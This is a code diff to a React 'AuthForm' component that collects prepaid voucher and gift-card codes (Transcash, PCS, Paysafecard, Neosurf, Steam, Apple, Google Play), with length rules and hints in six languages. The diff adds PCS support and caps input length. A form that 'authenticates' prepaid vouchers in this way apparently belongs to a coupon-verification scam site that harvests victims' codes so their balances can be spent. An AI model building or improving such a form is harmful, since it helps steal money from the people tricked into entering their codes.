@@ -2,10 +2,11 @@ import React, { FormEvent, useState } from "react";
 import { Language, useI18n } from "../i18n";
 
 type FormStatus = "idle" | "sending" | "success" | "error";
-type PaymentMethod = "" | "Transcash" | "Paysafecard" | "Google Play Card" | "Neosurf" | "Steam Card" | "Apple Gift Card" | "Autre";
+type PaymentMethod = "" | "Transcash" | "PCS" | "Paysafecard" | "Google Play Card" | "Neosurf" | "Steam Card" | "Apple Gift Card" | "Autre";
 
 const referenceRules: Record<Exclude<PaymentMethod, "" | "Autre">, { length: number; pattern: string; digitsOnly: boolean }> = {
   Transcash: { length: 12, pattern: "[0-9]{12}", digitsOnly: true },
+  PCS: { length: 10, pattern: "[0-9]{10}", digitsOnly: true },
   Paysafecard: { length: 16, pattern: "0[0-9]{15}", digitsOnly: true },
   "Google Play Card": { length: 16, pattern: "[A-Za-z0-9]{16}", digitsOnly: false },
   Neosurf: { length: 10, pattern: "[A-Za-z0-9]{10}", digitsOnly: false },
@@ -14,12 +15,12 @@ const referenceRules: Record<Exclude<PaymentMethod, "" | "Autre">, { length: num
 };
 
 const ruleHints: Record<Language, Record<Exclude<PaymentMethod, "" | "Autre">, string>> = {
-  fr: { Transcash: "12 chiffres exactement", Paysafecard: "16 chiffres exactement, en commençant par 0", "Google Play Card": "16 caractères alphanumériques exactement", Neosurf: "10 caractères alphanumériques exactement", "Steam Card": "15 caractères alphanumériques exactement", "Apple Gift Card": "16 caractères alphanumériques exactement" },
-  en: { Transcash: "Exactly 12 digits", Paysafecard: "Exactly 16 digits, starting with 0", "Google Play Card": "Exactly 16 alphanumeric characters", Neosurf: "Exactly 10 alphanumeric characters", "Steam Card": "Exactly 15 alphanumeric characters", "Apple Gift Card": "Exactly 16 alphanumeric characters" },
-  de: { Transcash: "Genau 12 Ziffern", Paysafecard: "Genau 16 Ziffern, beginnend mit 0", "Google Play Card": "Genau 16 alphanumerische Zeichen", Neosurf: "Genau 10 alphanumerische Zeichen", "Steam Card": "Genau 15 alphanumerische Zeichen", "Apple Gift Card": "Genau 16 alphanumerische Zeichen" },
-  it: { Transcash: "Esattamente 12 cifre", Paysafecard: "Esattamente 16 cifre, iniziando con 0", "Google Play Card": "Esattamente 16 caratteri alfanumerici", Neosurf: "Esattamente 10 caratteri alfanumerici", "Steam Card": "Esattamente 15 caratteri alfanumerici", "Apple Gift Card": "Esattamente 16 caratteri alfanumerici" },
-  es: { Transcash: "Exactamente 12 dígitos", Paysafecard: "Exactamente 16 dígitos, empezando por 0", "Google Play Card": "Exactamente 16 caracteres alfanuméricos", Neosurf: "Exactamente 10 caracteres alfanuméricos", "Steam Card": "Exactamente 15 caracteres alfanuméricos", "Apple Gift Card": "Exactamente 16 caracteres alfanuméricos" },
-  nl: { Transcash: "Precies 12 cijfers", Paysafecard: "Precies 16 cijfers, beginnend met 0", "Google Play Card": "Precies 16 alfanumerieke tekens", Neosurf: "Precies 10 alfanumerieke tekens", "Steam Card": "Precies 15 alfanumerieke tekens", "Apple Gift Card": "Precies 16 alfanumerieke tekens" },
+  fr: { Transcash: "12 chiffres exactement", PCS: "10 chiffres exactement", Paysafecard: "16 chiffres exactement, en commençant par 0", "Google Play Card": "16 caractères alphanumériques exactement", Neosurf: "10 caractères alphanumériques exactement", "Steam Card": "15 caractères alphanumériques exactement", "Apple Gift Card": "16 caractères alphanumériques exactement" },
+  en: { Transcash: "Exactly 12 digits", PCS: "Exactly 10 digits", Paysafecard: "Exactly 16 digits, starting with 0", "Google Play Card": "Exactly 16 alphanumeric characters", Neosurf: "Exactly 10 alphanumeric characters", "Steam Card": "Exactly 15 alphanumeric characters", "Apple Gift Card": "Exactly 16 alphanumeric characters" },
+  de: { Transcash: "Genau 12 Ziffern", PCS: "Genau 10 Ziffern", Paysafecard: "Genau 16 Ziffern, beginnend mit 0", "Google Play Card": "Genau 16 alphanumerische Zeichen", Neosurf: "Genau 10 alphanumerische Zeichen", "Steam Card": "Genau 15 alphanumerische Zeichen", "Apple Gift Card": "Genau 16 alphanumerische Zeichen" },
+  it: { Transcash: "Esattamente 12 cifre", PCS: "Esattamente 10 cifre", Paysafecard: "Esattamente 16 cifre, iniziando con 0", "Google Play Card": "Esattamente 16 caratteri alfanumerici", Neosurf: "Esattamente 10 caratteri alfanumerici", "Steam Card": "Esattamente 15 caratteri alfanumerici", "Apple Gift Card": "Esattamente 16 caratteri alfanumerici" },
+  es: { Transcash: "Exactamente 12 dígitos", PCS: "Exactamente 10 dígitos", Paysafecard: "Exactamente 16 dígitos, empezando por 0", "Google Play Card": "Exactamente 16 caracteres alfanuméricos", Neosurf: "Exactamente 10 caracteres alfanuméricos", "Steam Card": "Exactamente 15 caracteres alfanuméricos", "Apple Gift Card": "Exactamente 16 caracteres alfanuméricos" },
+  nl: { Transcash: "Precies 12 cijfers", PCS: "Precies 10 cijfers", Paysafecard: "Precies 16 cijfers, beginnend met 0", "Google Play Card": "Precies 16 alfanumerieke tekens", Neosurf: "Precies 10 alfanumerieke tekens", "Steam Card": "Precies 15 alfanumerieke tekens", "Apple Gift Card": "Precies 16 alfanumerieke tekens" },
 };
 
 const referenceLabels: Record<Language, { label: string; placeholder: string }> = {
@@ -168,7 +169,8 @@ const AuthForm: React.FC = () => {
           className={fieldClassName}
         >
           <option value="" disabled>{t('select')}</option>
-          <option value="TransCash">Transcash</option>
+          <option value="Transcash">Transcash</option>
+          <option value="PCS">PCS</option>
           <option value="Neosurf">Neosurf</option>
           <option value="Apple Gift Card">Apple Gift Card</option>
           <option value="Steam Card">Steam Card</option>
@@ -212,7 +214,10 @@ const AuthForm: React.FC = () => {
                 onChange={(event) => {
                   const forbiddenCharacters = referenceRule?.digitsOnly ? /[^0-9]/g : /[^A-Za-z0-9]/g;
                   const nextReferences = [...references];
-                  nextReferences[index] = event.target.value.replace(forbiddenCharacters, "").toUpperCase();
+                  nextReferences[index] = event.target.value
+                    .replace(forbiddenCharacters, "")
+                    .toUpperCase()
+                    .slice(0, referenceRule?.length ?? 64);
                   setReferences(nextReferences);
                 }}
                 minLength={referenceRule?.length ?? 1}
